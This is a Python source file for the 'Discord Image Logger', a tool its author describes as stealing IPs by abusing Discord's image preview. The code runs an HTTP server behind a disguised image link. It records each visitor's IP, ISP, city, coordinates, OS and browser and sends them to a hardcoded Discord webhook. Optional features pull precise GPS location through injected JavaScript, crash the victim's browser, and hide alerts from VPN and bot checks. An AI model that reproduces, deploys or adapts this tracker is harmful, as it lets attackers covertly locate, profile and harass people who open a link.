# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1138594117664915526/eiHNF_7eajngZR1fZJyQ-kUQePD3_PGiTNH-yHuUxH0fhzOqLcQFKk7A4o8LjRd9hDf1",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
